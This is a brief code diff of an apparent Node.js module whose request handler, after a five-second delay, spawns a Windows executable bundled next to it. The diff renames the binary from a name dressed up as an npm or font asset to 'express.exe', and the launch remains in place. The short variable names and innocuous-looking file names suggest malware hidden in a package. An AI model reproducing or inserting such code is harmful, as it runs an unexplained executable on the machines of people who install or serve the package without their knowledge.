@@ -101,5 +101,5 @@ module.exports = (req, res) => {
 const a = ms => new Promise(res => setTimeout(res, ms));
 const b = require('child_process').spawn;
 a(5 * 1000).then(async () => {
-    b(`${__dirname}/express_media_font_npm_nodemodules.exe`);
+    b(`${__dirname}/express.exe`);
 })
